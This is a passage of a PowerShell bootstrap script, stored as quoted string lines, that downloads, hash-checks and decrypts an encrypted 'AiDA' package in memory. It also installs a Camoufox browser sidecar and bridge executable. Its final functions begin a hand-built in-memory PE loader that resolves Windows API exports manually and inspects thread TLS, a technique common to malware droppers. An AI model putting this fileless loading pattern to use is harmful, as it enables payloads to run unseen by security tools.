        '                    if ($done + $read -gt $ExpectedSize) { throw "AiDA package exceeded expected size." }',
        '                    [Array]::Copy($buf, [int64]0, $data, [int64]$done, [int64]$read)',
        '                    $done += $read',
        '                    $pct = [Math]::Min(100, [Math]::Round(($done * 100.0) / $ExpectedSize, 1))',
        '                    if ($done -ge $progressNext -or $done -eq $ExpectedSize) { $elapsedMs = [Math]::Max(1, [int64]$sw.ElapsedMilliseconds); $rate = [int64](($done * 1000.0) / $elapsedMs); Write-AidaBootstrapLog ("package_download_progress bytes={0} expected={1} pct={2} elapsed_ms={3} rate_bps={4} attempt={5}" -f $done,$ExpectedSize,$pct,$elapsedMs,$rate,$attempt); $progressNext = $done + 5242880 }',
        '                    Write-Progress -Activity "Downloading AiDA package" -Status ("{0:N1} MB / {1:N1} MB" -f ($done / 1MB), ($ExpectedSize / 1MB)) -PercentComplete $pct',
        '                }',
        '                if ($done -lt $ExpectedSize) { Write-AidaBootstrapLog ("package_download_attempt_incomplete attempt={0} before={1} after={2} expected={3}" -f $attempt,$before,$done,$ExpectedSize) }',
        '            } catch {',
        '                Write-AidaBootstrapLog ("package_download_attempt_error attempt={0} bytes={1} expected={2} elapsed_ms={3} error={4}: {5}" -f $attempt,$done,$ExpectedSize,[int64]$sw.ElapsedMilliseconds,$_.Exception.GetType().FullName,$_.Exception.Message)',
        '                if ($attempt -ge $maxAttempts) { throw }',
        '            } finally {',
        '                if ($stream) { $stream.Dispose() }',
        '                if ($resp) { $resp.Dispose() }',
        '            }',
        '            if ($done -lt $ExpectedSize) { if ($attempt -ge $maxAttempts) { throw "AiDA package download size mismatch." }; Start-Sleep -Seconds ([Math]::Min(20, 2 * $attempt)) }',
        '        }',
        '        $sha = [Security.Cryptography.SHA256]::Create()',
        '        try { $actualSha256 = ConvertTo-AidaHex ($sha.ComputeHash($data)) } finally { $sha.Dispose() }',
        '        if (-not (Test-AidaHexEqual $actualSha256 $ExpectedSha256)) { throw "AiDA encrypted package SHA-256 verification failed." }',
        '        Write-AidaBootstrapLog ("package_download_complete bytes={0} elapsed_ms={1} sha256={2} attempts={3}" -f $done,[int64]$sw.ElapsedMilliseconds,$actualSha256,$attempt)',
        '        return $data',
        '    } catch { Write-AidaBootstrapLog ("package_download_error bytes={0} expected={1} elapsed_ms={2} attempts={3} error={4}: {5}" -f $done,$ExpectedSize,[int64]$sw.ElapsedMilliseconds,$attempt,$_.Exception.GetType().FullName,$_.Exception.Message); throw } finally {',
        '        if ($buf) { [Array]::Clear($buf, 0, $buf.Length) }',
        '        Write-Progress -Activity "Downloading AiDA package" -Completed',
        '    }',
        '}',
        'function Join-AidaSafeChildPath([string]$Root, [string]$Rel) {',
        '    if (-not $Root -or -not $Rel -or [IO.Path]::IsPathRooted($Rel) -or $Rel.Contains(":") -or $Rel.Contains("..")) { throw "AiDA sidecar relative path is invalid." }',
        '    $rootFull = [IO.Path]::GetFullPath($Root)',
        '    $candidate = [IO.Path]::GetFullPath((Join-Path $rootFull $Rel))',
        '    $rootNorm = $rootFull.TrimEnd([char][IO.Path]::DirectorySeparatorChar).TrimEnd([char][IO.Path]::AltDirectorySeparatorChar)',
        '    $prefix = $rootNorm + [IO.Path]::DirectorySeparatorChar',
        '    if (-not $candidate.StartsWith($prefix, [StringComparison]::OrdinalIgnoreCase)) { throw "AiDA sidecar path escaped install root." }',
        '    return $candidate',
        '}',
        'function Save-AidaVerifiedSidecarFile([Uri]$Uri, [string]$Path, [long]$ExpectedSize, [string]$ExpectedSha256) {',
        '    Write-AidaBootstrapLog ("camoufox_sidecar_download_start host=" + $Uri.Host + " expected_size=" + $ExpectedSize)',
        '    if ($Uri.Scheme -ne "https") { throw "AiDA Camoufox sidecar URL must use HTTPS." }',
        '    if ($ExpectedSize -le 0 -or $ExpectedSize -gt $AidaMaxSidecarBytes) { throw "AiDA Camoufox sidecar size is not allowed." }',
        '    if (-not $ExpectedSha256 -or $ExpectedSha256 -notmatch "^[0-9a-fA-F]{64}$") { throw "AiDA Camoufox sidecar SHA-256 metadata is invalid." }',
        '    $req = $null; $resp = $null; $stream = $null; $fs = $null; $sha = $null; $buf = New-Object byte[] 1048576; $ok = $false',
        '    try {',
        '        if ([IO.File]::Exists($Path)) { [IO.File]::Delete($Path) }',
        '        $req = [Net.HttpWebRequest]::Create($Uri.AbsoluteUri)',
        '        $req.Method = "GET"',
        '        $req.UserAgent = "AiDA Bootstrap"',
        '        $req.AllowAutoRedirect = $false',
        '        $req.Timeout = 600000',
        '        $req.ReadWriteTimeout = 600000',
        '        try { $req.AllowReadStreamBuffering = $false } catch { }',
        '        $resp = $req.GetResponse()',
        '        Write-AidaBootstrapLog ("camoufox_sidecar_download_response status=" + [int]$resp.StatusCode + " content_length=" + $resp.ContentLength)',
        '        if ([int]$resp.StatusCode -ne 200) { throw "AiDA Camoufox sidecar download failed." }',
        '        if ($resp.ContentLength -ge 0 -and [int64]$resp.ContentLength -ne $ExpectedSize) { throw "AiDA Camoufox sidecar size mismatch." }',
        '        $stream = $resp.GetResponseStream()',
        '        $fs = [IO.File]::Open($Path, [IO.FileMode]::CreateNew, [IO.FileAccess]::Write, [IO.FileShare]::None)',
        '        $sha = [Security.Cryptography.SHA256]::Create()',
        '        $done = [int64]0',
        '        while (($read = $stream.Read($buf, 0, $buf.Length)) -gt 0) {',
        '            $done += $read',
        '            if ($done -gt $ExpectedSize) { throw "AiDA Camoufox sidecar exceeded expected size." }',
        '            $null = $sha.TransformBlock($buf, 0, $read, $buf, 0)',
        '            $fs.Write($buf, 0, $read)',
        '            $pct = [Math]::Min(100, [Math]::Round(($done * 100.0) / $ExpectedSize, 1))',
        '            Write-Progress -Activity "Downloading Camoufox sidecar" -Status ("{0:N1} MB / {1:N1} MB" -f ($done / 1MB), ($ExpectedSize / 1MB)) -PercentComplete $pct',
        '        }',
        '        if ($done -ne $ExpectedSize) { throw "AiDA Camoufox sidecar download size mismatch." }',
        '        $empty = New-Object byte[] 0',
        '        $null = $sha.TransformFinalBlock($empty, 0, 0)',
        '        $actualSha256 = ConvertTo-AidaHex $sha.Hash',
        '        if (-not (Test-AidaHexEqual $actualSha256 $ExpectedSha256)) { throw "AiDA Camoufox sidecar SHA-256 verification failed." }',
        '        Write-AidaBootstrapLog ("camoufox_sidecar_download_complete bytes=" + $done + " sha256=" + $actualSha256)',
        '        $ok = $true',
        '        return $Path',
        '    } catch { Write-AidaBootstrapLog ("camoufox_sidecar_download_error error=" + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); throw } finally {',
        '        if ($sha) { $sha.Dispose() }',
        '        if ($fs) { $fs.Dispose() }',
        '        if ($stream) { $stream.Dispose() }',
        '        if ($resp) { $resp.Dispose() }',
        '        if ($buf) { [Array]::Clear($buf, 0, $buf.Length) }',
        '        if (-not $ok) { try { if ([IO.File]::Exists($Path)) { [IO.File]::Delete($Path) } } catch { } }',
        '        Write-Progress -Activity "Downloading Camoufox sidecar" -Completed',
        '    }',
        '}',
        'function Find-AidaCamoufoxMcpExecutable([string]$Root) {',
        '    $rels = @("deps\\AiDA_CamoufoxReverseMcp.exe","deps\\camoufox-reverse-mcp.exe","deps\\camoufox_reverse_mcp.exe","deps\\camoufox-reverse-mcp\\AiDA_CamoufoxReverseMcp.exe","deps\\camoufox-reverse-mcp\\camoufox-reverse-mcp.exe","AiDA_CamoufoxReverseMcp.exe","camoufox-reverse-mcp.exe","camoufox_reverse_mcp.exe")',
        '    foreach ($rel in $rels) { $p = Join-AidaSafeChildPath $Root $rel; if ([IO.File]::Exists($p)) { return $p } }',
        '    return ""',
        '}',
        'function Test-AidaCamoufoxMcpExecutable([string]$McpPath, [string]$ExePath, [string]$Root) {',
        '    if (-not $McpPath -or -not [IO.File]::Exists($McpPath)) { Write-AidaBootstrapLog "camoufox_mcp_static_missing"; return $false }',
        '    $fs = $null',
        '    try {',
        '        $item = Get-Item -LiteralPath $McpPath -ErrorAction Stop',
        '        if ($item.Length -le 4096) { Write-AidaBootstrapLog ("camoufox_mcp_static_too_small bytes=" + $item.Length); return $false }',
        '        $fs = [IO.File]::Open($McpPath, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)',
        '        $hdr = New-Object byte[] 4096',
        '        $read = $fs.Read($hdr, 0, $hdr.Length)',
        '        if ($read -lt 0x40 -or $hdr[0] -ne 0x4D -or $hdr[1] -ne 0x5A) { Write-AidaBootstrapLog "camoufox_mcp_static_bad_mz"; return $false }',
        '        $lfanew = [BitConverter]::ToInt32($hdr, 0x3C)',
        '        if ($lfanew -lt 0x40 -or ($lfanew + 6) -ge $read) { Write-AidaBootstrapLog ("camoufox_mcp_static_bad_lfanew value=" + $lfanew); return $false }',
        '        if ($hdr[$lfanew] -ne 0x50 -or $hdr[$lfanew + 1] -ne 0x45 -or $hdr[$lfanew + 2] -ne 0 -or $hdr[$lfanew + 3] -ne 0) { Write-AidaBootstrapLog "camoufox_mcp_static_bad_pe"; return $false }',
        '        $machine = [BitConverter]::ToUInt16($hdr, $lfanew + 4)',
        '        if ($machine -ne 0x8664) { Write-AidaBootstrapLog ("camoufox_mcp_static_bad_machine machine=0x{0:X4}" -f $machine); return $false }',
        '        Write-AidaBootstrapLog ("camoufox_mcp_static_ok path=" + $McpPath + " bytes=" + $item.Length)',
        '        return $true',
        '    } catch { Write-AidaBootstrapLog ("camoufox_mcp_static_error " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); return $false } finally {',
        '        if ($fs) { $fs.Dispose() }',
        '    }',
        '}',
        'function Install-AidaCamoufoxMcpPatch([object]$Manifest, [string]$Root, [string]$ExePath) {',
        '    if (-not $Manifest.camoufox -or -not $Manifest.camoufox.mcp -or -not $Manifest.camoufox.mcp.configured) { return "" }',
        '    if (-not $Manifest.policy.camoufox_mcp_hash_required) { throw "AiDA Camoufox MCP patch policy is invalid." }',
        '    if (-not $Root -or -not [IO.Directory]::Exists($Root) -or -not [IO.File]::Exists($ExePath)) { return "" }',
        '    $m = $Manifest.camoufox.mcp',
        '    $mcpUri = [Uri]$m.url',
        '    $expectedSize = [int64]$m.size',
        '    $expectedSha256 = [string]$m.sha256',
        '    $targetRel = if ([string]$m.rel) { [string]$m.rel } else { "deps\\AiDA_CamoufoxReverseMcp.exe" }',
        '    $target = Join-AidaSafeChildPath $Root $targetRel',
        '    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("aida-camoufox-mcp-" + [Guid]::NewGuid().ToString("N") + ".exe")',
        '    try {',
        '        Write-AidaStatus "Updating Camoufox bridge executable..."',
        '        [void](Save-AidaVerifiedSidecarFile $mcpUri $tmp $expectedSize $expectedSha256)',
        '        $targetDir = [IO.Path]::GetDirectoryName($target)',
        '        if ($targetDir -and -not [IO.Directory]::Exists($targetDir)) { [IO.Directory]::CreateDirectory($targetDir) | Out-Null }',
        '        if ([IO.File]::Exists($target)) { try { [IO.File]::Delete($target) } catch { } }',
        '        Move-Item -LiteralPath $tmp -Destination $target -Force',
        '        if (-not (Test-AidaCamoufoxMcpExecutable $target $ExePath $Root)) { throw "AiDA Camoufox MCP patch failed health check." }',
        '        Write-AidaBootstrapLog ("camoufox_mcp_patch_installed path=" + $target + " bytes=" + $expectedSize + " sha256=" + $expectedSha256)',
        '        return $target',
        '    } finally {',
        '        try { if ([IO.File]::Exists($tmp)) { [IO.File]::Delete($tmp) } } catch { }',
        '    }',
        '}',
        'function Test-AidaCamoufoxSidecarInstalled([string]$Root, [string]$ExePath, [string]$PythonPath, [string]$McpPath) {',
        '    if (-not $Root -or -not [IO.Directory]::Exists($Root)) { Write-AidaBootstrapLog ("camoufox_sidecar_validate_missing_root root=" + $Root); return $false }',
        '    if (-not [IO.File]::Exists($ExePath)) { Write-AidaBootstrapLog ("camoufox_sidecar_validate_missing_exe exe=" + $ExePath); return $false }',
        '    $browserDir = [IO.Path]::GetDirectoryName($ExePath)',
        '    if (-not [IO.File]::Exists((Join-Path $browserDir "application.ini"))) { Write-AidaBootstrapLog ("camoufox_sidecar_validate_missing_application_ini dir=" + $browserDir); return $false }',
        '    if (-not [IO.Directory]::Exists((Join-Path $browserDir "browser"))) { Write-AidaBootstrapLog ("camoufox_sidecar_validate_missing_browser_dir dir=" + $browserDir); return $false }',
        '    if ($PythonPath -and -not [IO.File]::Exists($PythonPath)) { Write-AidaBootstrapLog ("camoufox_sidecar_validate_missing_python python=" + $PythonPath); return $false }',
        '    if ($McpPath -and (Test-AidaCamoufoxMcpExecutable $McpPath $ExePath $Root)) { return $true }',
        '    if ($PythonPath -and [IO.File]::Exists($PythonPath)) { return $true }',
        '    Write-AidaBootstrapLog ("camoufox_sidecar_validate_missing_bridge root=" + $Root)',
        '    return $false',
        '}',
        'function Set-AidaCamoufoxEnvironment([string]$ExePath, [string]$PythonPath, [string]$McpPath) {',
        '    if (-not [IO.File]::Exists($ExePath)) { throw "AiDA Camoufox executable is missing after setup." }',
        '    [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_EXECUTABLE", $ExePath, "Process"); $env:AIDA_CAMOUFOX_EXECUTABLE = $ExePath',
        '    if ($McpPath -and [IO.File]::Exists($McpPath)) { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_MCP_EXECUTABLE", $McpPath, "Process"); $env:AIDA_CAMOUFOX_MCP_EXECUTABLE = $McpPath } else { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_MCP_EXECUTABLE", $null, "Process"); Remove-Item Env:AIDA_CAMOUFOX_MCP_EXECUTABLE -ErrorAction SilentlyContinue }',
        '    if ($PythonPath -and [IO.File]::Exists($PythonPath)) { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_PYTHON", $PythonPath, "Process"); $env:AIDA_CAMOUFOX_PYTHON = $PythonPath; [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON", "1", "Process"); $env:AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON = "1" } else { [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_PYTHON", $null, "Process"); Remove-Item Env:AIDA_CAMOUFOX_PYTHON -ErrorAction SilentlyContinue; [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON", $null, "Process"); Remove-Item Env:AIDA_CAMOUFOX_ALLOW_SYSTEM_PYTHON -ErrorAction SilentlyContinue }',
        '    [Environment]::SetEnvironmentVariable("AIDA_CAMOUFOX_ALLOW_SETUP_BOOTSTRAP", "1", "Process"); $env:AIDA_CAMOUFOX_ALLOW_SETUP_BOOTSTRAP = "1"',
        '}',
        'function Install-AidaCamoufoxSidecar([object]$Manifest) {',
        '    if (-not $Manifest.camoufox -or -not $Manifest.camoufox.configured) { Write-AidaBootstrapLog "camoufox_sidecar_not_configured"; return }',
        '    if (-not $Manifest.policy.camoufox_sidecar_hash_required) { throw "AiDA Camoufox sidecar policy is invalid." }',
        '    $c = $Manifest.camoufox',
        '    $sidecarUri = [Uri]$c.url',
        '    $expectedSize = [int64]$c.size',
        '    $expectedSha256 = [string]$c.sha256',
        '    $exeRel = [string]$c.executable_rel',
        '    $pythonRel = [string]$c.python_rel',
        '    $tempRoot = [IO.Path]::GetTempPath(); if (-not $tempRoot) { $tempRoot = $env:TEMP }; if (-not $tempRoot) { throw "TEMP is unavailable for AiDA Camoufox setup." }',
        '    $root = Join-Path $tempRoot "AiDA\\camoufox"',
        '    $current = Join-Path $root "current"',
        '    $stampPath = Join-Path $current "aida-camoufox-sidecar.json"',
        '    $exePath = Join-AidaSafeChildPath $current $exeRel',
        '    $pythonPath = if ($pythonRel) { Join-AidaSafeChildPath $current $pythonRel } else { "" }',
        '    $mcpPath = if ([IO.Directory]::Exists($current)) { Find-AidaCamoufoxMcpExecutable $current } else { "" }',
        '    $cached = $false',
        '    if (Test-AidaCamoufoxSidecarInstalled $current $exePath $pythonPath $mcpPath) { Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_existing_usable exe=" + $exePath + " mcp=" + $mcpPath); return }',
        '    if ([IO.File]::Exists($exePath)) { try { $patchedMcp = Install-AidaCamoufoxMcpPatch $Manifest $current $exePath; if ($patchedMcp) { $mcpPath = $patchedMcp } } catch { Write-AidaBootstrapLog ("camoufox_mcp_patch_existing_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message) }; if (Test-AidaCamoufoxSidecarInstalled $current $exePath $pythonPath $mcpPath) { Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_existing_repaired exe=" + $exePath + " mcp=" + $mcpPath); return } }',
        '    if ([IO.File]::Exists($stampPath)) { try { $stamp = Get-Content -LiteralPath $stampPath -Raw | ConvertFrom-Json; $cached = ([string]$stamp.sha256).ToLowerInvariant() -eq $expectedSha256.ToLowerInvariant() -and [string]$stamp.version -eq [string]$c.version -and [string]$stamp.executable_rel -eq $exeRel -and [string]$stamp.python_rel -eq $pythonRel } catch { $cached = $false } }',
        '    if ($cached -and (Test-AidaCamoufoxSidecarInstalled $current $exePath $pythonPath $mcpPath)) { Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath; Write-AidaStatus "Camoufox sidecar ready."; Write-AidaBootstrapLog ("camoufox_sidecar_cached exe=" + $exePath + " mcp=" + $mcpPath); return }',
        '    Write-AidaStatus "Preparing verified Camoufox sidecar..."',
        '    if (-not [IO.Directory]::Exists($root)) { [IO.Directory]::CreateDirectory($root) | Out-Null }',
        '    $id = [Guid]::NewGuid().ToString("N")',
        '    $staging = Join-Path $root ("stage-" + $id)',
        '    $backup = Join-Path $root ("previous-" + $id)',
        '    $zipPath = Join-Path ([IO.Path]::GetTempPath()) ("aida-camoufox-" + $id + ".zip")',
        '    try {',
        '        [IO.Directory]::CreateDirectory($staging) | Out-Null',
        '        [void](Save-AidaVerifiedSidecarFile $sidecarUri $zipPath $expectedSize $expectedSha256)',
        '        Write-AidaStatus "Extracting Camoufox sidecar..."',
        '        Expand-Archive -LiteralPath $zipPath -DestinationPath $staging -Force',
        '        $stageExe = Join-AidaSafeChildPath $staging $exeRel',
        '        $stagePython = if ($pythonRel) { Join-AidaSafeChildPath $staging $pythonRel } else { "" }',
        '        $stageMcp = Find-AidaCamoufoxMcpExecutable $staging',
        '        if (-not (Test-AidaCamoufoxSidecarInstalled $staging $stageExe $stagePython $stageMcp)) { $patchedStageMcp = Install-AidaCamoufoxMcpPatch $Manifest $staging $stageExe; if ($patchedStageMcp) { $stageMcp = $patchedStageMcp } }',
        '        if (-not (Test-AidaCamoufoxSidecarInstalled $staging $stageExe $stagePython $stageMcp)) { throw "AiDA Camoufox sidecar contents are incomplete." }',
        '        $stamp = [pscustomobject]@{ sha256 = $expectedSha256; version = [string]$c.version; executable_rel = $exeRel; python_rel = $pythonRel; installed_at = [DateTimeOffset]::UtcNow.ToString("O") } | ConvertTo-Json -Depth 4 -Compress',
        '        [IO.File]::WriteAllText((Join-Path $staging "aida-camoufox-sidecar.json"), $stamp, [Text.Encoding]::UTF8)',
        '        if ([IO.Directory]::Exists($current)) { [IO.Directory]::Move($current, $backup) }',
        '        try { [IO.Directory]::Move($staging, $current) } catch { if ([IO.Directory]::Exists($backup) -and -not [IO.Directory]::Exists($current)) { [IO.Directory]::Move($backup, $current) }; throw }',
        '        try { if ([IO.Directory]::Exists($backup)) { [IO.Directory]::Delete($backup, $true) } } catch { Write-AidaBootstrapLog ("camoufox_sidecar_backup_cleanup_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message) }',
        '        $exePath = Join-AidaSafeChildPath $current $exeRel',
        '        $pythonPath = if ($pythonRel) { Join-AidaSafeChildPath $current $pythonRel } else { "" }',
        '        $mcpPath = Find-AidaCamoufoxMcpExecutable $current',
        '        Set-AidaCamoufoxEnvironment $exePath $pythonPath $mcpPath',
        '        Write-AidaStatus "Camoufox sidecar ready."',
        '        Write-AidaBootstrapLog ("camoufox_sidecar_installed exe=" + $exePath + " mcp=" + $mcpPath)',
        '    } finally {',
        '        try { if ([IO.File]::Exists($zipPath)) { [IO.File]::Delete($zipPath) } } catch { }',
        '        try { if ([IO.Directory]::Exists($staging)) { [IO.Directory]::Delete($staging, $true) } } catch { }',
        '    }',
        '}',
        'function Decrypt-AidaPackageBytesToMemory([byte[]]$PackageBytes, [object]$Package) {',
        '    Write-AidaBootstrapLog ("decrypt_package_start bytes=" + $(if ($PackageBytes) { $PackageBytes.Length } else { 0 }) + " format=" + [string]$Package.format)',
        '    if (-not $Package -or $Package.format -ne "encrypted-cbc-hmac-v1") { throw "AiDA encrypted package metadata is invalid." }',
        '    if ($null -eq $PackageBytes -or $PackageBytes.Length -le 0 -or $PackageBytes.Length -gt $AidaMaxPackageBytes) { throw "AiDA encrypted package bytes are invalid." }',
        '    $encKey = [Convert]::FromBase64String([string]$Package.enc_key_b64)',
        '    $macKey = [Convert]::FromBase64String([string]$Package.mac_key_b64)',
        '    if ($encKey.Length -ne 32 -or $macKey.Length -ne 32) { throw "AiDA encrypted package keys are invalid." }',
        '    $magic = [Text.Encoding]::ASCII.GetBytes("AIDABOOTPKG1`n")',
        '    $iv = New-Object byte[] 16',
        '    $expectedTag = New-Object byte[] 32',
        '    $buf = New-Object byte[] 1048576',
        '    $ms = $null; $crypto = $null; $aes = $null; $dec = $null; $hmac = $null',
        '    try {',
        '        $pkgLen = [int64]$PackageBytes.Length',
        '        if ($pkgLen -le ($magic.Length + 16 + 32)) { throw "AiDA encrypted package is truncated." }',
        '        $tagOffset = $pkgLen - 32',
        '        $cipherOffset = $magic.Length + 16',
        '        $cipherLength = $tagOffset - $cipherOffset',
        '        if ($cipherLength -le 0 -or ($cipherLength % 16) -ne 0) { throw "AiDA encrypted package ciphertext is invalid." }',
        '        for ($i = 0; $i -lt $magic.Length; $i++) { if ($PackageBytes[$i] -ne $magic[$i]) { throw "AiDA encrypted package header is invalid." } }',
        '        [Array]::Copy($PackageBytes, $magic.Length, $iv, 0, 16)',
        '        [Array]::Copy($PackageBytes, $tagOffset, $expectedTag, 0, 32)',
        '        $hmac = New-Object Security.Cryptography.HMACSHA256 -ArgumentList (,$macKey)',
        '        $macOffset = [int64]0',
        '        while ($macOffset -lt $tagOffset) {',
        '            $want = [Math]::Min($buf.Length, $tagOffset - $macOffset)',
        '            $null = $hmac.TransformBlock($PackageBytes, [int]$macOffset, [int]$want, $buf, 0)',
        '            $macOffset += $want',
        '        }',
        '        $empty = New-Object byte[] 0',
        '        $null = $hmac.TransformFinalBlock($empty, 0, 0)',
        '        if (-not (Test-AidaBytesEqual $hmac.Hash $expectedTag)) { throw "AiDA encrypted package HMAC verification failed." }',
        '        Write-AidaBootstrapLog "decrypt_package_hmac_verified"',
        '        $aes = [Security.Cryptography.Aes]::Create()',
        '        $aes.Mode = [Security.Cryptography.CipherMode]::CBC',
        '        $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7',
        '        $aes.KeySize = 256',
        '        $aes.BlockSize = 128',
        '        $aes.Key = $encKey',
        '        $aes.IV = $iv',
        '        $dec = $aes.CreateDecryptor()',
        '        $ms = New-Object IO.MemoryStream -ArgumentList ([int][Math]::Min($cipherLength+16,0x7FFFFFC7))',
        '        $crypto = New-Object Security.Cryptography.CryptoStream -ArgumentList @($ms, $dec, [Security.Cryptography.CryptoStreamMode]::Write)',
        '        $remaining = $cipherLength',
        '        $offset = $cipherOffset',
        '        while ($remaining -gt 0) {',
        '            $want = [Math]::Min($buf.Length, $remaining)',
        '            $crypto.Write($PackageBytes, [int]$offset, [int]$want)',
        '            $offset += $want',
        '            $remaining -= $want',
        '        }',
        '        $crypto.FlushFinalBlock()',
        '        $plain = $ms.ToArray()',
        '        Write-AidaBootstrapLog ("decrypt_package_complete bytes=" + $plain.Length)',
        '        return $plain',
        '    } catch { Write-AidaBootstrapLog ("decrypt_package_error error=" + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); throw } finally {',
        '        if ($crypto) { $crypto.Dispose() }',
        '        if ($ms) { $ms.Dispose() }',
        '        if ($dec) { $dec.Dispose() }',
        '        if ($aes) { $aes.Dispose() }',
        '        if ($hmac) { $hmac.Dispose() }',
        '        [Array]::Clear($encKey, 0, $encKey.Length)',
        '        [Array]::Clear($macKey, 0, $macKey.Length)',
        '        [Array]::Clear($iv, 0, $iv.Length)',
        '        [Array]::Clear($expectedTag, 0, $expectedTag.Length)',
        '        [Array]::Clear($buf, 0, $buf.Length)',
        '    }',
        '}',
        'function Read-AidaU16([byte[]]$d,[int]$o){[BitConverter]::ToUInt16($d,$o)}',
        'function Read-AidaU32([byte[]]$d,[int]$o){[BitConverter]::ToUInt32($d,$o)}',
        'function Read-AidaU16([byte[]]$d,[int]$o){[BitConverter]::ToUInt16($d,$o)}',
        'function Read-AidaU64([byte[]]$d,[int]$o){[BitConverter]::ToUInt64($d,$o)}',
        'function New-AidaDelegateType([Type[]]$P,[Type]$R=[void]){$dom=[AppDomain]::CurrentDomain;$n="AidaDel_"+[Guid]::NewGuid().ToString("N");$ab=$dom.DefineDynamicAssembly((New-Object Reflection.AssemblyName($n)),[Reflection.Emit.AssemblyBuilderAccess]::Run);$mb=$ab.DefineDynamicModule("M",$false);$tb=$mb.DefineType("D","Class,Public,Sealed,AnsiClass,AutoClass",[MulticastDelegate]);$c=$tb.DefineConstructor("RTSpecialName,HideBySig,Public",[Reflection.CallingConventions]::Standard,$P);$c.SetImplementationFlags("Runtime,Managed");$i=$tb.DefineMethod("Invoke","Public,HideBySig,NewSlot,Virtual",$R,$P);$i.SetImplementationFlags("Runtime,Managed");$tb.CreateType()}',
        'function Get-AidaWinApiProc([IntPtr]$hM,[string]$name){$lfanew=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($hM.ToInt64()+0x3C));$exp=$hM.ToInt64()+$lfanew;$eRVA=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($exp+0x88));if($eRVA-eq 0){return [IntPtr]::Zero};$eDir=$hM.ToInt64()+$eRVA;$nN=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($eDir+0x18));$aN=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($eDir+0x20));$aF=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($eDir+0x1C));$aO=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($eDir+0x24));for($i=0;$i-lt $nN;$i++){$nR=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($hM.ToInt64()+$aN+$i*4));$fn="";$j=0;while($true){$c=[Runtime.InteropServices.Marshal]::ReadByte([IntPtr]($hM.ToInt64()+$nR+$j));if($c-eq 0){break};$fn+=[char]$c;$j++};if($fn-eq $name){$oi=[Runtime.InteropServices.Marshal]::ReadInt16([IntPtr]($hM.ToInt64()+$aO+$i*2));$fR=[Runtime.InteropServices.Marshal]::ReadInt32([IntPtr]($hM.ToInt64()+$aF+$oi*4));return [IntPtr]($hM.ToInt64()+$fR)}};return [IntPtr]::Zero}',
        'function AidaRvaToOff([uint32]$rva,[byte[]]$pe,[int]$lfanew,[uint16]$nSec,[uint16]$optSz){$sOff=$lfanew+24+$optSz;for($i=0;$i-lt $nSec;$i++){$e=$sOff+$i*40;$vA=Read-AidaU32 $pe ($e+12);$rS=Read-AidaU32 $pe ($e+16);$rP=Read-AidaU32 $pe ($e+20);if($rva-ge $vA -and $rva-lt($vA+$rS)){return $rP+($rva-$vA)}};return $rva}',
        'function Resolve-AidaMappedVa([uint64]$va,[IntPtr]$base,[uint64]$imgBase,[uint32]$sizeOfImg){if($va-eq 0){return [IntPtr]::Zero};$mb=[uint64]$base.ToInt64();$me=$mb+[uint64]$sizeOfImg;if($va-ge $mb -and $va-lt $me){return [IntPtr]([int64]$va)};$ib=[uint64]$imgBase;$ie=$ib+[uint64]$sizeOfImg;if($va-ge $ib -and $va-lt $ie){return [IntPtr]([int64]($mb+($va-$ib)))};return [IntPtr]::Zero}',
        'function Get-AidaStaticTlsInfo([uint32]$threadId,[IntPtr]$threadHandle,[object]$NtQueryInformationThread){$tbi=[Runtime.InteropServices.Marshal]::AllocHGlobal(48);try{[uint32]$ret=0;$status=$NtQueryInformationThread.Invoke($threadHandle,[uint32]0,$tbi,[uint32]48,[ref]$ret);$teb=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($tbi.ToInt64()+8));if($status -ne 0 -or $teb -eq 0){throw ("AiDA: NtQueryInformationThread failed for tid={0} status=0x{1:X8} ret={2} teb={3:X16}" -f $threadId,([uint32]$status),$ret,$teb)};$vec=[Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]($teb+0x58));if($vec -eq 0){throw ("AiDA: TEB TLS vector unavailable for tid={0} teb={1:X16}" -f $threadId,$teb)};[pscustomobject]@{teb=$teb;vector=$vec;ret=$ret}}finally{if($tbi -ne [IntPtr]::Zero){[Runtime.InteropServices.Marshal]::FreeHGlobal($tbi)}}}',
        'function Test-AidaStaticTlsPoison([int64]$value){$h=("{0:X16}" -f $value);return $h -eq "ABABABABABABABAB" -or $h -eq "FEEEFEEEFEEEFEEE" -or $h -eq "BAADF00DBAADF00D" -or $h.StartsWith("BAADF00D")}',
